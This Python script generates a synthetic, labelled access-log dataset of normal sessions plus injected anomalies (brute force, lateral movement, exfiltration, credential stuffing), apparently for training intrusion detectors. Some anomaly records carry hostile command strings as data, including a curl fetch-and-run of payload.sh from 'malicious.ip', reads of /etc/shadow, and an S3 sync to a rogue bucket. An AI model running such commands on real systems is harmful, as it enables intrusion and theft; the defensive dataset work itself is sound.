import pandas as pd
import numpy as np
from faker import Faker
import random
import uuid
from datetime import datetime, timedelta
import os

# Initialize Faker for generating realistic data
fake = Faker()

def generate_entities(num_entities=500):
    """
    Generates baseline entities (users and devices) with specific behavioral traits.
    """
    entities = []
    entity_types = ['User', 'Device']
    departments = ['HR', 'Finance', 'Engineering', 'Marketing', 'Sales', 'IT', 'Operations', 'Executive']
    auth_methods = ['Password', 'MFA', 'SSO', 'Biometric', 'Hardware Token']
    resources = ['VPN', 'Email', 'CRM', 'Database', 'GitLab', 'AWS Console', 'Jira', 'Confluence', 'HRIS', 'Intranet']
    
    for _ in range(num_entities):
        # 85% Users, 15% Devices
        entity_type = random.choices(entity_types, weights=[0.85, 0.15])[0]
        
        department = random.choice(departments) if entity_type == 'User' else 'IT'
        home_country = fake.country()
        default_city = fake.city()
        default_ip = fake.ipv4()
        
        # Differentiate devices for Users vs Infrastructure Devices
        if entity_type == 'User':
            os_choice = random.choice(['Windows 11', 'macOS 13', 'Ubuntu 22.04', 'Windows 10'])
            browser_choice = random.choice(['Chrome', 'Firefox', 'Safari', 'Edge'])
            default_device = f"{os_choice} - {browser_choice}"
        else:
            default_device = random.choice(['IoT Sensor', 'Network Router', 'Database Server', 'App Server', 'Load Balancer'])
        
        # Preferred login window (e.g., 9-to-5 worker vs. night shift)
        login_hour_start = random.randint(6, 11)
        login_hour_end = login_hour_start + random.randint(8, 10)
        preferred_login_window = f"{login_hour_start:02d}:00-{login_hour_end:02d}:00"
        
        preferred_auth = random.choice(auth_methods)
        
        # Assign 1 to 4 commonly accessed resources per entity
        num_resources = random.randint(1, 4)
        preferred_res = ",".join(random.sample(resources, num_resources))
        
        entities.append({
            'entity_id': str(uuid.uuid4()),
            'entity_type': entity_type,
            'department': department,
            'home_country': home_country,
            'default_city': default_city,
            'default_ip': default_ip,
            'default_device': default_device,
            'preferred_login_window': preferred_login_window,
            'preferred_auth_method': preferred_auth,
            'preferred_resources': preferred_res
        })
    
    return pd.DataFrame(entities)

def generate_logs(entities_df, days=30):
    """
    Generates realistic daily login behavior logs for the given entities.
    """
    logs = []
    
    # Start generation from 30 days ago
    start_date = datetime.now() - timedelta(days=days)
    
    # Common command sets based on resource type
    technical_commands = ['git pull', 'git push', 'aws s3 ls', 'docker ps', 'kubectl get pods', 'ssh -i key.pem']
    db_commands = ['SELECT * FROM users', 'UPDATE records', 'pg_dump', 'EXPLAIN ANALYZE']
    
    for day in range(days):
        current_date = start_date + timedelta(days=day)
        
        for _, entity in entities_df.iterrows():
            # Baseline behavior: Not everyone logs in every single day (e.g. weekends/leave)
            # 80% chance of being active on any given day
            if random.random() > 0.8:
                continue
                
            # Parse preferred login window bounds
            window_parts = entity['preferred_login_window'].split('-')
            start_hour = int(window_parts[0].split(':')[0])
            end_hour = int(window_parts[1].split(':')[0])
            
            # Generate 1 to 5 access sessions per day
            num_sessions = random.randint(1, 5)
            
            for _ in range(num_sessions):
                # Generate timestamp typically within their preferred window
                if start_hour < end_hour:
                    login_hour = random.randint(start_hour, end_hour - 1)
                else:
                    # In case it loops over midnight (not typical for these baseline generation bounds, but good practice)
                    login_hour = random.choice(list(range(start_hour, 24)) + list(range(0, end_hour)))
                    
                login_minute = random.randint(0, 59)
                login_second = random.randint(0, 59)
                
                timestamp = current_date.replace(hour=login_hour, minute=login_minute, second=login_second, microsecond=0)
                
                # Baseline variation:
                # 90% chance of using default IP, 10% chance of a new IP (e.g., coffee shop, mobile)
                source_ip = entity['default_ip'] if random.random() < 0.9 else fake.ipv4()
                
                # 90% chance of being in their home location, 10% chance traveling
                geo_location = f"{entity['default_city']}, {entity['home_country']}" if random.random() < 0.9 else f"{fake.city()}, {fake.country()}"
                
                # 95% chance of using preferred auth, 5% fallback (e.g., Password instead of MFA)
                auth_method = entity['preferred_auth_method'] if random.random() < 0.95 else 'Password'
                
                # Pick a resource from their preferred list or rarely a general access one
                pref_resources = entity['preferred_resources'].split(',')
                all_resources = ['VPN', 'Email', 'CRM', 'Database', 'GitLab', 'AWS Console', 'Jira', 'Confluence', 'HRIS', 'Intranet']
                resource_accessed = random.choice(pref_resources) if random.random() < 0.9 else random.choice(all_resources)
                
                # Session duration in seconds (1 min to 8 hours)
                session_duration = random.randint(60, 28800)
                
                # Determine command sequence if applicable
                command_sequence = "N/A"
                if entity['entity_type'] == 'User':
                    if resource_accessed in ['GitLab', 'AWS Console']:
                        command_sequence = " -> ".join(random.sample(technical_commands, random.randint(1, 3)))
                    elif resource_accessed == 'Database':
                        command_sequence = " -> ".join(random.sample(db_commands, random.randint(1, 2)))
                
                # 95% chance to use the same device fingerprint, 5% device upgrade/change
                device_fingerprint = entity['default_device'] if random.random() < 0.95 else f"{entity['default_device']} (Updated)"
                
                # 98% login success rate for baseline (normal typo/password forgets happen)
                login_success = True if random.random() < 0.98 else False
                
                logs.append({
                    'entity_id': entity['entity_id'],
                    'entity_type': entity['entity_type'],
                    'timestamp': timestamp.isoformat(),
                    'source_ip': source_ip,
                    'geo_location': geo_location,
                    'resource_accessed': resource_accessed,
                    'auth_method': auth_method,
                    'session_duration': session_duration,
                    'command_sequence': command_sequence,
                    'device_fingerprint': device_fingerprint,
                    'login_success': login_success,
                    'label': "Normal"
                })
                
    # Create DataFrame and sort by time to make the logs realistic
    logs_df = pd.DataFrame(logs)
    logs_df['timestamp'] = pd.to_datetime(logs_df['timestamp'])
    logs_df = logs_df.sort_values(by='timestamp').reset_index(drop=True)
    
    return logs_df

def inject_bruteforce(logs_df):
    """
    Inject brute-force attacks into approximately 1% of sessions.
    Returns a DataFrame containing only the anomaly records.
    """
    anomalies = []
    
    # Select 1% of normal logs to be the targets of brute force attacks
    target_sessions = logs_df.sample(frac=0.01, random_state=random.randint(0, 10000))
    
    for _, session in target_sessions.iterrows():
        entity_id = session['entity_id']
        entity_type = session['entity_type']
        
        # A brute force attack typically comes from a single malicious IP
        attacker_ip = fake.ipv4()
        
        # Determine the number of failed attempts
        num_attempts = random.randint(15, 50)
        
        # Start the attack a few minutes before the normal session
        base_timestamp = session['timestamp'] - timedelta(minutes=random.randint(5, 60))
        
        for i in range(num_attempts):
            # Very short intervals (1 to 5 seconds between attempts)
            attempt_time = base_timestamp + timedelta(seconds=i * random.randint(1, 5))
            
            anomalies.append({
                'entity_id': entity_id,
                'entity_type': entity_type,
                'timestamp': attempt_time.isoformat(),
                'source_ip': attacker_ip,
                'geo_location': f"{fake.city()}, {fake.country()}",
                'resource_accessed': session['resource_accessed'],
                'auth_method': 'Password',
                'session_duration': 0,
                'command_sequence': "N/A",
                'device_fingerprint': "Unknown Script/Bot",
                'login_success': False,
                'label': "BruteForce"
            })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        anomaly_df = anomaly_df.sort_values(by='timestamp').reset_index(drop=True)
        
    return anomaly_df

def inject_impossible_travel(logs_df):
    """
    Inject impossible travel anomalies into approximately 0.5% of sessions.
    Generates a second successful login from a distant location within a short timeframe.
    """
    anomalies = []
    
    # Select 0.5% of normal logs
    target_sessions = logs_df.sample(frac=0.005, random_state=random.randint(0, 10000))
    
    for _, session in target_sessions.iterrows():
        entity_id = session['entity_id']
        entity_type = session['entity_type']
        
        # Impossible travel time: 10 to 60 minutes later
        time_offset = timedelta(minutes=random.randint(10, 60))
        attempt_time = session['timestamp'] + time_offset
        
        # Distant location (different country)
        attacker_ip = fake.ipv4()
        original_country = session['geo_location'].split(', ')[-1] if ', ' in session['geo_location'] else session['geo_location']
        
        distant_location = f"{fake.city()}, {fake.country()}"
        # Ensure it's not the same country
        while distant_location.split(', ')[-1] == original_country:
            distant_location = f"{fake.city()}, {fake.country()}"
        
        # This event itself is the anomaly
        anomalies.append({
            'entity_id': entity_id,
            'entity_type': entity_type,
            'timestamp': attempt_time.isoformat(),
            'source_ip': attacker_ip,
            'geo_location': distant_location,
            'resource_accessed': session['resource_accessed'],
            'auth_method': session['auth_method'],
            'session_duration': random.randint(60, 3600),
            'command_sequence': "N/A",
            'device_fingerprint': "Unknown Browser/Device",
            'login_success': True,
            'label': "Impossible Travel"
        })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df
def inject_lateral_movement(logs_df):
    """
    Inject lateral movement anomalies into approximately 0.5% of sessions.
    Simulates an attacker moving through the network, accessing multiple new 
    resources and executing privilege escalation/discovery commands.
    """
    anomalies = []
    
    # Select 0.5% of normal logs to be the starting point of lateral movement
    target_sessions = logs_df.sample(frac=0.005, random_state=random.randint(0, 10000))
    
    lateral_commands = [
        'whoami -> net user /domain -> nmap -sT 10.0.0.0/24',
        'ping -> ssh admin@10.0.0.5 -> sudo su',
        'curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh',
        'powershell.exe -ExecutionPolicy Bypass -File recon.ps1',
        'arp -a -> wmic process call create "cmd.exe /c set"',
        'cat /etc/passwd -> cat /etc/shadow -> su root'
    ]
    
    all_resources = ['VPN', 'Email', 'CRM', 'Database', 'GitLab', 'AWS Console', 'Jira', 'Confluence', 'HRIS', 'Intranet', 'Domain Controller', 'Backup Server']
    
    for _, session in target_sessions.iterrows():
        entity_id = session['entity_id']
        entity_type = session['entity_type']
        
        # Lateral movement usually starts shortly after a successful initial access
        base_timestamp = session['timestamp'] + timedelta(minutes=random.randint(5, 30))
        
        # Attacker explores 2 to 5 different resources
        num_hops = random.randint(2, 5)
        
        for i in range(num_hops):
            attempt_time = base_timestamp + timedelta(minutes=i * random.randint(2, 10))
            
            # Access critical or random resources, simulating lateral movement
            resource_accessed = random.choice(all_resources)
            
            # Abnormal commands for privilege escalation or discovery
            command_sequence = random.choice(lateral_commands)
            
            anomalies.append({
                'entity_id': entity_id,
                'entity_type': entity_type,
                'timestamp': attempt_time.isoformat(),
                # IP and location typically remain the same as the compromised host during the pivot
                'source_ip': session['source_ip'], 
                'geo_location': session['geo_location'],
                'resource_accessed': resource_accessed,
                'auth_method': session['auth_method'],
                'session_duration': random.randint(300, 7200),
                'command_sequence': command_sequence,
                'device_fingerprint': session['device_fingerprint'],
                'login_success': True,  # Attacker successfully moving laterally
                'label': "Lateral Movement"
            })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df
def inject_device_spoofing(logs_df):
    """
    Inject device spoofing anomalies into approximately 0.5% of sessions.
    Simulates a login from a known entity but with a completely different 
    device fingerprint (OS, browser, MAC).
    """
    anomalies = []
    
    target_sessions = logs_df.sample(frac=0.005, random_state=random.randint(0, 10000))
    
    for _, session in target_sessions.iterrows():
        entity_id = session['entity_id']
        entity_type = session['entity_type']
        
        spoofed_os = random.choice(['Kali Linux', 'Parrot OS', 'Android 14', 'iOS 17', 'BlackArch'])
        spoofed_browser = random.choice(['Tor Browser', 'Brave', 'Curl', 'Wget'])
        spoofed_mac = fake.mac_address()
        
        spoofed_fingerprint = f"{spoofed_os} - {spoofed_browser} - MAC: {spoofed_mac}"
        
        attempt_time = session['timestamp'] + timedelta(minutes=random.randint(1, 15))
        
        anomalies.append({
            'entity_id': entity_id,
            'entity_type': entity_type,
            'timestamp': attempt_time.isoformat(),
            'source_ip': fake.ipv4(),
            'geo_location': session['geo_location'],
            'resource_accessed': session['resource_accessed'],
            'auth_method': session['auth_method'],
            'session_duration': random.randint(60, 1800),
            'command_sequence': "N/A",
            'device_fingerprint': spoofed_fingerprint,
            'login_success': True,
            'label': "Device Spoofing"
        })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df
def inject_low_and_slow(logs_df):
    """
    Inject low and slow exfiltration anomalies.
    Gradually increases unusual resource access over several days.
    Very difficult to detect because it uses normal IPs, devices, and times.
    """
    anomalies = []
    
    # Pick a few distinct entities to perform the low and slow exfiltration
    unique_entities = logs_df['entity_id'].unique()
    target_entities = random.sample(list(unique_entities), 2) if len(unique_entities) >= 2 else []
    
    exfiltration_commands = [
        'SELECT * FROM customers -> \copy to dump.csv',
        'tar -czf backup.tar.gz /var/www/html',
        'aws s3 sync . s3://rogue-bucket/',
        'mysqldump -u root -p database > backup.sql'
    ]
    
    for entity_id in target_entities:
        # Get normal logs for this entity to extract their baseline profile
        entity_logs = logs_df[logs_df['entity_id'] == entity_id].sort_values(by='timestamp')
        if entity_logs.empty:
            continue
            
        profile = entity_logs.iloc[0]
        entity_type = profile['entity_type']
        
        # We'll use the last 14 days of the dataset period
        end_time = logs_df['timestamp'].max()
        start_time = end_time - timedelta(days=14)
        
        target_resource = random.choice(['Database', 'Backup Server', 'AWS Console', 'GitLab'])
        exfil_command = random.choice(exfiltration_commands)
        
        # Gradually increase frequency over 14 days
        # Day 1: 1 access, Day 4: 1 access, Day 7: 2 accesses, Day 10: 3 accesses, Day 13: 4 accesses, Day 14: 5 accesses
        schedule = [
            (1, 1), (4, 1), (7, 2), (10, 3), (13, 4), (14, 5)
        ]
        
        for day_offset, num_accesses in schedule:
            current_day = start_time + timedelta(days=day_offset)
            
            for i in range(num_accesses):
                # Perform the access at a seemingly normal time (e.g., between 9 AM and 5 PM)
                attempt_time = current_day.replace(hour=random.randint(9, 17), minute=random.randint(0, 59))
                
                anomalies.append({
                    'entity_id': entity_id,
                    'entity_type': entity_type,
                    'timestamp': attempt_time.isoformat(),
                    'source_ip': profile['source_ip'], # Normal IP
                    'geo_location': profile['geo_location'], # Normal location
                    'resource_accessed': target_resource, # Unusual but consistent resource
                    'auth_method': profile['auth_method'],
                    'session_duration': random.randint(1800, 7200), # Longer sessions for data transfer
                    'command_sequence': exfil_command,
                    'device_fingerprint': profile['device_fingerprint'], # Normal device
                    'login_success': True,
                    'label': "Low and Slow Exfiltration"
                })
                
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df

def inject_credential_stuffing(logs_df):
    """
    Inject credential stuffing anomalies.
    Simulates a single IP attempting to login to many different accounts.
    """
    anomalies = []
    attacker_ip = fake.ipv4()
    users = logs_df[logs_df['entity_type'] == 'User'].drop_duplicates(subset=['entity_id'])
    
    if len(users) > 50:
        targets = users.sample(n=50, random_state=random.randint(0, 10000))
    else:
        targets = users
        
    start_time = logs_df['timestamp'].min() + timedelta(days=random.randint(1, 28))
    
    for i, (_, user) in enumerate(targets.iterrows()):
        attempt_time = start_time + timedelta(seconds=i * random.randint(1, 3))
        success = True if random.random() < 0.02 else False
        
        anomalies.append({
            'entity_id': user['entity_id'],
            'entity_type': 'User',
            'timestamp': attempt_time.isoformat(),
            'source_ip': attacker_ip,
            'geo_location': f"{fake.city()}, {fake.country()}",
            'resource_accessed': 'Email',
            'auth_method': 'Password',
            'session_duration': random.randint(60, 300) if success else 0,
            'command_sequence': "N/A",
            'device_fingerprint': "Unknown Script/Bot",
            'login_success': success,
            'label': "Credential Stuffing"
        })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df

def inject_insider_drift(logs_df):
    """
    Inject insider drift anomalies.
    Simulates a legitimate user whose behavior gradually changes over time.
    """
    anomalies = []
    users = logs_df[logs_df['entity_type'] == 'User']['entity_id'].unique()
    target_users = random.sample(list(users), 2) if len(users) >= 2 else []
    sensitive_resources = ['Database', 'HRIS', 'AWS Console']
    
    for user_id in target_users:
        user_logs = logs_df[logs_df['entity_id'] == user_id].sort_values(by='timestamp')
        if user_logs.empty:
            continue
            
        profile = user_logs.iloc[0]
        end_time = logs_df['timestamp'].max()
        start_time = end_time - timedelta(days=7)
        
        for day in range(7):
            current_day = start_time + timedelta(days=day)
            attempt_time = current_day.replace(hour=random.randint(1, 4), minute=random.randint(0, 59))
            resource_accessed = random.choice(sensitive_resources)
            
            # provide a fallback for dictionary lookups
            default_ip = profile.get('default_ip', profile['source_ip'])
            default_device = profile.get('default_device', profile['device_fingerprint'])
            pref_auth = profile.get('preferred_auth_method', profile['auth_method'])
            
            anomalies.append({
                'entity_id': user_id,
                'entity_type': 'User',
                'timestamp': attempt_time.isoformat(),
                'source_ip': default_ip,
                'geo_location': profile['geo_location'],
                'resource_accessed': resource_accessed,
                'auth_method': pref_auth,
                'session_duration': random.randint(3600, 14400),
                'command_sequence': "N/A",
                'device_fingerprint': default_device,
                'login_success': True,
                'label': "Insider Drift"
            })
            
    anomaly_df = pd.DataFrame(anomalies)
    if not anomaly_df.empty:
        anomaly_df['timestamp'] = pd.to_datetime(anomaly_df['timestamp'])
        
    return anomaly_df

def main():
    print("Starting baseline dataset generation...")
    
    # 1. Generate Entities
    print("Generating entities (500 expected)...")
    entities_df = generate_entities(num_entities=500)
    
    # 2. Generate Logs (30 days)
    print("Generating 30 days of baseline access logs...")
    logs_df = generate_logs(entities_df, days=30)
    
    # 3. Inject Brute-Force Anomalies
    print("Injecting brute-force anomalies...")
    brute_force_df = inject_bruteforce(logs_df)
    
    # 4. Inject Impossible Travel Anomalies
    print("Injecting impossible travel anomalies...")
    impossible_travel_df = inject_impossible_travel(logs_df)
    
    # 5. Inject Lateral Movement Anomalies
    print("Injecting lateral movement anomalies...")
    lateral_movement_df = inject_lateral_movement(logs_df)
    
    # 6. Inject Device Spoofing Anomalies
    print("Injecting device spoofing anomalies...")
    device_spoofing_df = inject_device_spoofing(logs_df)
    
    # 7. Inject Low and Slow Anomalies
    print("Injecting low and slow exfiltration anomalies...")
    low_and_slow_df = inject_low_and_slow(logs_df)
    
    # 8. Inject Credential Stuffing Anomalies
    print("Injecting credential stuffing anomalies...")
    credential_stuffing_df = inject_credential_stuffing(logs_df)
    
    # 9. Inject Insider Drift Anomalies
    print("Injecting insider drift anomalies...")
    insider_drift_df = inject_insider_drift(logs_df)
    
    # Combine anomalies
    anomaly_df = pd.concat([brute_force_df, impossible_travel_df, lateral_movement_df, device_spoofing_df, low_and_slow_df, credential_stuffing_df, insider_drift_df], ignore_index=True)
    if not anomaly_df.empty:
        anomaly_df = anomaly_df.sort_values(by='timestamp').reset_index(drop=True)
    
    # Ensure ~98% Normal and ~2% Anomaly ratio
    target_anomaly_count = int(len(logs_df) * (0.02 / 0.98))
    
    if len(anomaly_df) > target_anomaly_count:
        # Downsample anomalies
        anomaly_df = anomaly_df.head(target_anomaly_count)
    elif len(anomaly_df) < target_anomaly_count:
        # Downsample normal logs
        target_normal_count = int(len(anomaly_df) * (0.98 / 0.02))
        logs_df = logs_df.sample(n=target_normal_count, random_state=42).reset_index(drop=True)
    
    # 8. Create Final Dataset
    print("Merging and shuffling final dataset...")
    final_df = pd.concat([logs_df, anomaly_df], ignore_index=True)
    final_df = final_df.sample(frac=1.0, random_state=42).reset_index(drop=True)
    
    # Determine the directory where this script is located
    output_dir = os.path.dirname(os.path.abspath(__file__))
    
    entities_path = os.path.join(output_dir, 'entities.csv')
    logs_path = os.path.join(output_dir, 'normal_logs.csv')
    anomaly_path = os.path.join(output_dir, 'anomaly_logs.csv')
    final_path = os.path.join(output_dir, 'final_dataset.csv')
    
    # Save the datasets
    entities_df.to_csv(entities_path, index=False)
    logs_df.to_csv(logs_path, index=False)
    if not anomaly_df.empty:
        anomaly_df.to_csv(anomaly_path, index=False)
    final_df.to_csv(final_path, index=False)
    
    print("\nDataset generation complete!")
    print(f" -> Entities dataset saved to: {entities_path} | Shape: {entities_df.shape}")
    print(f" -> Normal Logs dataset saved to: {logs_path} | Shape: {logs_df.shape}")
    print(f" -> Anomaly dataset saved to: {anomaly_path} | Shape: {anomaly_df.shape}")
    print(f" -> Final merged dataset saved to: {final_path} | Shape: {final_df.shape}")
    
    # Verify Ratio
    anomaly_pct = (len(final_df[final_df['label'] != 'Normal']) / len(final_df)) * 100
    print(f" -> Final Dataset Anomaly Ratio: {anomaly_pct:.2f}%")

if __name__ == "__main__":
    main()
